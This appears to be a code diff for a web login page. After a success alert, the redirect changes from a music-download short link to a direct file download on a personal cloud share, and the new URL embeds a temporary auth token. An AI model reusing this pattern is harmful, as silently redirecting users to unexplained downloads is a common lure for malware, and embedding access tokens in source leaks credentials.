@@ -134,7 +134,7 @@ function login() {
         timer: 2500,
       }).then(() => {
         // Redirect to another page after the alert
-        window.location.href = "https://bit.ly/next-music-download"; // Replace "your-link-here" with the URL you want to redirect to
+        window.location.href = "https://my.microsoftpersonalcontent.com/personal/b2011b3b073024bf/_layouts/15/download.aspx?UniqueId=a90410ba-ffb5-45cc-b2b4-fc6e1a4ce72e&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiI4NjkzYTY5NS1jYmNhLTRjMTItYWJmMi1jZGFiYzg2YjU3NTgiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzI5MjczOTAyIn0.KCOp6G-cOsUlA8ZVM5mBGLtRGNEYeHPQSWOjcV-DvnG6Mqoj9DyM-h-WVnah0jG_NdWudTYiq-nAyrxcDeC_UiVxDcw-8br3pYec4KczLG_JRvP8RuolehjSLrNYf9KSEtp14mB8AmpTiakpHmnA5pCPfLmzBn5pAxmnap-MlY0uB4lMqE17K3D3HjUKhGXVgDi78fLvm2i6-_6MjqGcFb5WuhMHNUTa7shN5Ff3-veIptucjppO7RVJWFtsT97VpQubDuin00JIdm1esSwDPgg5HdEpvigKjxfM8Yr63PKCwE5c1G21J8aGfC0ozU7pjlxtuzF1v7Pxnk0vHFo9fN1fw_SHR6EB2XBSK6Cns19AS_gFkH-Vgyv-uCnqq4Y3K9AWUNhatYTs13FGxgdIvcClzaVkValX10Cyn_0skvE5b-JJ4oCxD2LR5UU_evhUuuZuCYMbz9TU8IEQxhlL7-SIurqXBuvt0UbTu9oqRD5qCrznJ9Dza57AJhrWD5hw2c2AVeGyRcHbFtgzIQ0zXA.nRn1vd4OffrmFPqoUW2EkQe9lFa_sWecQAVoVHSgpMA&ApiVersion=2.0"; // Replace "your-link-here" with the URL you want to redirect to
       });
     })
     .catch(function (error) {
